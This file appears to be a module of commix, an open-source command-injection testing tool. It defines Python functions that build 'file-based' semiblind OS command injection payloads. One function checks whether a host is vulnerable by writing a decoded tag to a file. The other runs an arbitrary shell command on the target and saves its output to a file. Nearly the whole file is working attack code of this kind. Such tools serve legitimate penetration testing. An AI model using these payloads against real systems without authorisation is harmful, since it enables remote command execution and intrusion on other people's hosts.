#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

"""
    The "file-based" technique on Semiblind-based OS Command Injection.
  The available "file-based" payloads.
"""

# File-based decision payload (check if host is vulnerable). 
def decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
  
  payload = (separator + " " +
	     "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " >" + OUTPUT_TEXTFILE + ")"
	    ) 
  
  return payload


# Execute shell commands on vulnerable host.
def cmd_execution(separator,cmd,OUTPUT_TEXTFILE):
  
  payload = (separator +
	     "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
	    )

  return payload
